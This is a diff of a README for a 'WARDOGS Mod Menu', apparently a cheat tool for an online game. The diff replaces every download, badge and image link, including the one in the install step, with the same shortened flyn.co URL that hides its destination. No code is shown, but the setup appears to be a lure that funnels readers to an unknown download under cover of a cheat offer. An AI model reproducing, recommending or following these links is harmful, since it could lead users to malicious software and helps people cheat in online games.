@@ -10,28 +10,28 @@ The interface is organized around player and squad information, vehicles, logist
 
 ## Quick Access
 
-[![WARDOGS](https://img.shields.io/badge/WARDOGS-Mod%20Menu-c89c42?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Players](https://img.shields.io/badge/Player-Squad%20Info-4686bd?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Vehicles](https://img.shields.io/badge/Vehicles-Logistics-af7e32?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Objective](https://img.shields.io/badge/Control%20Zone-Tools-3c9d59?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Profiles](https://img.shields.io/badge/Config-Profiles-656b72?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-846225?style=for-the-badge)](https://idleobstacle.github.io/)
+[![WARDOGS](https://img.shields.io/badge/WARDOGS-Mod%20Menu-c89c42?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Players](https://img.shields.io/badge/Player-Squad%20Info-4686bd?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Vehicles](https://img.shields.io/badge/Vehicles-Logistics-af7e32?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Objective](https://img.shields.io/badge/Control%20Zone-Tools-3c9d59?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Profiles](https://img.shields.io/badge/Config-Profiles-656b72?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-846225?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download WARDOGS Mod Menu](https://idleobstacle.github.io/)**
+➡️ **[Download WARDOGS Mod Menu](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![WARDOGS Mod Menu](assets/wardogs-mod-menu-preview.png)](https://idleobstacle.github.io/)
+[![WARDOGS Mod Menu](assets/wardogs-mod-menu-preview.png)](https://flyn.co/17yeN7/)
 
 ### Interface
 
-[![WARDOGS Mod Menu Interface](assets/wardogs-mod-menu-interface.png)](https://idleobstacle.github.io/)
+[![WARDOGS Mod Menu Interface](assets/wardogs-mod-menu-interface.png)](https://flyn.co/17yeN7/)
 
 ### Real Game Reference
 
@@ -186,7 +186,7 @@ Map
 
 1. Download the current package:
 
-   **[Download WARDOGS Mod Menu](https://idleobstacle.github.io/)**
+   **[Download WARDOGS Mod Menu](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the current README.
